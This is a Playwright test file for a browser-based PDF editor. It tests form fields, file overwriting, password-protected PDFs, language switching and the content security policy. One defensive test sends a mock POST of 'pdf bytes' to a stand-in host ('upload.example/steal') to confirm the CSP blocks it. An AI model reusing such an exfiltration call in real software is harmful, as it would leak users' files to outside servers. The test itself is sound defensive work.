    await page.getByTestId('file-input').setInputFiles(pdfFile('leer.pdf', bytes));
    await expect(page.locator('.card img').first()).toBeVisible();
    await page.getByRole('button', { name: 'Lesen', exact: true }).click();
    await expect(page.locator('.read-page img').first()).toBeVisible();
  }

  async function download(page: Page) {
    const file = page.waitForEvent('download');
    await page.getByRole('button', { name: 'PDF speichern' }).click();
    return downloadBytes(await file);
  }

  test('adds fields of every kind, saves them as real form fields and fills them in again', async ({ app: page }) => {
    await openOne(page, await makePdf([{ width: 595 }]));
    const sheet = page.locator('.read-page').first();
    await tool(page, 'Eingabefeld').click();
    await sheet.click({ position: { x: 100, y: 100 } });
    await page.getByRole('button', { name: /^Kommentare \(/ }).click();
    const name = page.getByLabel('Name des Feldes');
    await name.fill('Vorname');
    await name.blur();
    await tool(page, 'Kästchen').click();
    await sheet.click({ position: { x: 100, y: 160 } });
    await tool(page, 'Optionsfeld').click();
    await sheet.click({ position: { x: 100, y: 210 } });
    await tool(page, 'Optionsfeld').click();
    await sheet.click({ position: { x: 160, y: 210 } });
    await tool(page, 'Auswahlliste').click();
    await sheet.click({ position: { x: 100, y: 260 } });
    await page.getByLabel('Einträge, einer pro Zeile').fill('Rot\nGrün\nBlau');
    await page.getByLabel('Einträge, einer pro Zeile').blur();

    const bytes = await download(page);
    expect((await formFieldsOf(bytes)).map(([k, n]) => `${k}:${n}`)).toEqual(['text:Vorname', 'checkbox:Kästchen 1', 'radiobutton:Auswahl 1', 'radiobutton:Auswahl 1', 'combobox:Liste 1']);

    // The saved file opens with fillable fields.
    await page.getByTestId('file-input').setInputFiles(pdfFile('mit-feldern.pdf', bytes));
    await expect(page.getByRole('tab')).toHaveCount(2);
    await page.getByRole('button', { name: 'Lesen', exact: true }).click();
    await expect(page.getByRole('textbox', { name: 'Vorname' })).toBeVisible();
    await page.getByRole('textbox', { name: 'Vorname' }).fill('Erika');
    await page.getByRole('textbox', { name: 'Vorname' }).blur();
    await page.getByRole('radio', { name: 'Auswahl 1' }).nth(1).click();
    await expect(page.getByRole('radio', { name: 'Auswahl 1' }).nth(0)).toHaveAttribute('aria-checked', 'false');
    await expect(page.getByRole('radio', { name: 'Auswahl 1' }).nth(1)).toHaveAttribute('aria-checked', 'true');
    await page.getByRole('combobox', { name: 'Liste 1' }).selectOption('Grün');
    const filled = await download(page);
    expect((await formValues2(filled)).sort()).toEqual(['Erika', 'Grün', 'off', 'off', 'on'].sort());
  });

  test('deletes a field of the file', async ({ app: page }) => {
    await openOne(page, await makeFormPdf());
    await page.getByRole('button', { name: /^Kommentare \(/ }).click();
    await expect(page.locator('.comment-item').filter({ hasText: 'agree' })).toBeVisible();
    await page.locator('.comment-item').filter({ hasText: 'agree' }).getByRole('button', { name: 'Löschen' }).click();
    await expect(page.getByRole('checkbox', { name: 'agree' })).toHaveCount(0);
    const bytes = await download(page);
    expect((await formFieldsOf(bytes)).map(([, n]) => n)).toEqual(['name', 'colour', 'colour', 'colour', 'country']);
  });
});

test.describe('files handed over by the system', () => {
  // A stand-in for the File System Access API: handles that keep what is written into them.
  const fakeSystem = () => {
    const w = window as unknown as Record<string, unknown>;
    w.__written = null;
    // The browser has a launch queue of its own; this one replaces it.
    Object.defineProperty(window, 'launchQueue', { configurable: true, value: { setConsumer: (cb: unknown) => (w.__launch = cb) } });
    w.__handle = (name: string, bytes: number[]) => ({
      kind: 'file',
      name,
      getFile: async () => new File([new Uint8Array(bytes)], name, { type: 'application/pdf' }),
      createWritable: async () => ({
        write: async (data: Uint8Array) => {
          w.__written = Array.from(data);
        },
        close: async () => undefined,
      }),
      requestPermission: async () => 'granted',
    });
  };

  test('opens a PDF that the system hands over and writes the changed document back into the same file', async ({ app: page }) => {
    await page.addInitScript(fakeSystem);
    await page.reload();
    await page.waitForFunction(() => typeof (window as unknown as { __launch?: unknown }).__launch === 'function');
    const original = Array.from(await makePdf([{ width: 501 }, { width: 502 }]));
    await page.evaluate((bytes) => {
      const w = window as unknown as { __launch: (p: { files: unknown[] }) => void; __handle: (n: string, b: number[]) => unknown };
      w.__launch({ files: [w.__handle('echt.pdf', bytes)] });
    }, original);
    await expect(page.locator('.card')).toHaveCount(2);
    await expect(page.getByRole('button', { name: 'In der Datei speichern' })).toBeVisible();
    await card(page, 0).locator('.card-thumb').click();
    await page.getByRole('button', { name: 'Rechts drehen' }).click();
    await page.getByRole('button', { name: 'In der Datei speichern' }).click();
    await expect(page.getByText('Die Datei echt.pdf wird mit dem bearbeiteten Dokument überschrieben.')).toBeVisible();
    await page.getByRole('dialog').getByRole('button', { name: 'Überschreiben' }).click();
    await expect(page.getByText('Gespeichert in echt.pdf.')).toBeVisible();
    const written = await page.evaluate(() => (window as unknown as { __written: number[] }).__written);
    expect(await widthsAndRotations(new Uint8Array(written))).toEqual(['501@90', '502@0']);
  });

  test('offers no overwriting for a file that was opened without a handle', async ({ app: page }) => {
    await page.getByTestId('file-input').setInputFiles(pdfFile('a.pdf', await makePdf([{ width: 300 }])));
    await expect(page.locator('.card img')).toBeVisible();
    await expect(page.getByRole('button', { name: 'In der Datei speichern' })).toHaveCount(0);
  });
});

test.describe('legal pages', () => {
  test('are reachable from the start page and from a document, and lead back', async ({ app: page }) => {
    await page.getByRole('link', { name: 'Datenschutz' }).click();
    await expect(page.getByRole('heading', { name: 'Datenschutz', level: 2 })).toBeVisible();
    await expect(page.getByText('Deine PDF-Dateien verlassen deinen Browser nicht.')).toBeVisible();
    await page.getByRole('link', { name: 'Impressum' }).click();
    await expect(page.getByRole('heading', { name: 'Impressum', level: 2 })).toBeVisible();
    await page.getByRole('link', { name: 'Lizenzen' }).click();
    await expect(page.getByRole('link', { name: 'mupdf', exact: true })).toBeVisible();
    await expect(page.getByText('AGPL-3.0-or-later')).toBeVisible();
    await page.getByRole('link', { name: 'Zurück zu PDFgoat' }).click();
    await expect(page.getByRole('heading', { name: 'Edit PDFs without uploading.' }).or(page.getByRole('heading', { name: /ohne Upload/ }))).toBeVisible();
  });

  test('keep the open document while they are read', async ({ app: page }) => {
    await page.getByTestId('file-input').setInputFiles(pdfFile('bleibt.pdf', await makePdf([{ width: 300 }, { width: 301 }])));
    await expect(page.locator('.card')).toHaveCount(2);
    await card(page, 0).locator('.card-thumb').click();
    await page.getByRole('link', { name: 'Impressum' }).click();
    await expect(page.getByRole('heading', { name: 'Impressum', level: 2 })).toBeVisible();
    await page.goBack();
    await expect(page.locator('.card')).toHaveCount(2);
    await expect(page.locator('.card.selected')).toHaveCount(1);
  });

  test('speak English when the language is switched, and show no warning now that the details are complete', async ({ app: page }) => {
    await page.getByRole('button', { name: 'English' }).click();
    await page.getByRole('link', { name: 'Privacy' }).click();
    await expect(page.getByText('Your PDF files never leave your browser.')).toBeVisible();
    await expect(page.getByRole('alert')).toHaveCount(0);
    await expect(page.getByRole('link', { name: 'danielnagler1507@gmail.com' })).toBeVisible();
  });

  test('serve the licence texts', async ({ app: page, request, baseURL }) => {
    const licence = await request.get(new URL('LICENSE.txt', baseURL!).href);
    expect(await licence.text()).toContain('GNU AFFERO GENERAL PUBLIC LICENSE');
    const others = await (await request.get(new URL('third-party-licenses.txt', baseURL!).href)).text();
    for (const name of ['mupdf', 'react', 'tesseract.js', 'fflate', 'geist']) expect(others).toContain(name);
    void page;
  });
});

test.describe('files that cannot be opened', () => {
  test('rejects files that are not PDFs', async ({ app: page }) => {
    await page.getByTestId('file-input').setInputFiles(pdfFile('kaputt.pdf', Buffer.from('das ist kein pdf')));
    await expect(page.getByRole('alert')).toContainText('„kaputt.pdf“ konnte nicht als PDF gelesen werden');
    await expect(cards(page)).toHaveCount(0);
  });

  test('asks for the password of a protected PDF, retries after a wrong one and saves it unprotected', async ({ app: page }) => {
    await page.getByTestId('file-input').setInputFiles(pdfFile('geheim.pdf', await makeProtectedPdf('geheim')));
    const dialog = page.getByRole('dialog');
    await expect(dialog).toContainText('„geheim.pdf“ ist passwortgeschützt');

    await dialog.getByLabel('Passwort').fill('falsch');
    await dialog.getByRole('button', { name: 'Öffnen' }).click();
    await expect(dialog.getByRole('alert')).toContainText('Das Passwort stimmt nicht');

    await dialog.getByLabel('Passwort').fill('geheim');
    await dialog.getByRole('button', { name: 'Öffnen' }).click();
    await expect(cards(page)).toHaveCount(1);
    await expect(page.getByRole('status').filter({ hasText: 'Schutz entfernt' })).toBeVisible();

    const [download] = await Promise.all([page.waitForEvent('download'), page.getByRole('button', { name: /PDF speichern/ }).click()]);
    const bytes = await downloadBytes(download);
    expect(await widthsAndRotations(bytes)).toEqual(['400@0']);
    // An unprotected file opens without a password.
    expect(await describePdf(bytes)).toHaveLength(1);
  });

  test('skipping the password dialog opens nothing and shows no error', async ({ app: page }) => {
    await page.getByTestId('file-input').setInputFiles(pdfFile('geheim.pdf', await makeProtectedPdf('geheim')));
    await page.getByRole('dialog').getByRole('button', { name: 'Überspringen' }).click();
    await expect(page.getByRole('dialog')).toHaveCount(0);
    await expect(cards(page)).toHaveCount(0);
    await expect(page.getByRole('alert')).toHaveCount(0);
  });

  // Such a file opens without a password and is saved without protection.
  test('opens a PDF that is encrypted with an owner password only', async ({ app: page }) => {
    const bytes = await readFile(new URL('../files/owner-encrypted.pdf', import.meta.url));
    await page.getByTestId('file-input').setInputFiles(pdfFile('gesperrt.pdf', bytes));
    await expect(cards(page)).toHaveCount(2);
    await expect(page.getByRole('status').filter({ hasText: 'Schutz entfernt' })).toBeVisible();
  });

  test('names every broken file and still opens the good ones', async ({ app: page }) => {
    await page.getByTestId('file-input').setInputFiles([
      pdfFile('eins.pdf', Buffer.from('kaputt')),
      pdfFile('gut.pdf', await makePdf([{ width: 300 }])),
      pdfFile('zwei.pdf', Buffer.from('auch kaputt')),
    ]);
    const alert = page.getByRole('alert');
    await expect(alert).toContainText('„eins.pdf“');
    await expect(alert).toContainText('„zwei.pdf“');
    await expect(cards(page)).toHaveCount(1);
  });
});

test.describe('languages', () => {
  test('switches to English, keeps the choice and names downloads in English', async ({ app: page }) => {
    await page.getByRole('button', { name: 'English' }).click();
    await expect(page.getByText('Nothing is uploaded')).toBeVisible();
    await expect(page.locator('html')).toHaveAttribute('lang', 'en');
    await expect(page).toHaveTitle(/edit PDFs without uploading/);

    await page.reload();
    await expect(page.getByRole('button', { name: 'Choose PDF' })).toBeVisible();

    await openFixtures(page);
    await expect(page.getByText('5 pages from 2 files')).toBeVisible();
    await page.getByRole('button', { name: 'Split', exact: false }).first().click();
    await page.getByRole('textbox', { name: 'Page ranges' }).fill('9');
    await page.getByRole('button', { name: 'Split & download' }).click();
    await expect(page.getByRole('alert')).toContainText('“9” is outside 1–5.');
    await page.getByRole('textbox', { name: 'Page ranges' }).fill('1-2, 3-');

    const download = page.waitForEvent('download');
    await page.getByRole('button', { name: 'Split & download' }).click();
    const file = await download;
    expect(file.suggestedFilename()).toBe('merged-split.zip');
    expect(Object.keys(unzipSync(await downloadBytes(file)))).toEqual(['merged-01_p1-2.pdf', 'merged-02_p3-5.pdf']);

    await page.getByRole('button', { name: 'Deutsch' }).click();
    await expect(page.getByText('5 Seiten aus 2 Dateien')).toBeVisible();
  });

  test.describe('with an English browser', () => {
    test.use({ locale: 'en-US' });

    test('starts in English', async ({ app: page }) => {
      await expect(page.getByText('Nothing is uploaded')).toBeVisible();
      await expect(page.locator('html')).toHaveAttribute('lang', 'en');
    });
  });

  test.describe('with a browser in another language', () => {
    test.use({ locale: 'fr-FR' });

    test('falls back to English', async ({ app: page }) => {
      await expect(page.getByRole('button', { name: 'Choose PDF' })).toBeVisible();
    });
  });
});

// These tests provoke a blocked request on purpose, so they do not use the `app` fixture.
base.describe('content security policy', () => {
  base('is part of the page and allows connections to the own origin only', async ({ page }) => {
    await page.goto('/');
    const csp = await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute('content');
    expect(csp).toContain("default-src 'none'");
    expect(csp).toContain("connect-src 'self'");
    expect(csp).not.toContain('unsafe-inline');
    expect(csp).not.toMatch(/'unsafe-eval'/);

    // The headers file for the host carries the same policy and the usual hardening headers.
    const headers = await readFile(new URL('../../dist/_headers', import.meta.url), 'utf8');
    expect(headers).toContain(`Content-Security-Policy: ${csp}; frame-ancestors 'none'`);
    expect(headers).toContain('X-Content-Type-Options: nosniff');
    expect(headers).toContain('Referrer-Policy: no-referrer');
  });

  base('makes the browser itself refuse to send data to another server', async ({ page, context }) => {
    // Should the policy ever fail, the request still must not reach the internet.
    let reachedNetwork = false;
    await context.route('https://upload.example/**', (route) => {
      reachedNetwork = true;
      return route.abort();
    });
    await page.goto('/');
    const result = await page.evaluate(async () => {
      const violation = new Promise<string>((resolve) =>
        document.addEventListener('securitypolicyviolation', (e) => resolve(e.effectiveDirective), { once: true }),
      );
      const sent = await fetch('https://upload.example/steal', { method: 'POST', body: 'pdf bytes' }).then(
        () => true,
        () => false,
      );
      return { sent, directive: await violation };
    });
    expect(result).toEqual({ sent: false, directive: 'connect-src' });
    expect(reachedNetwork).toBe(false);
  });
});
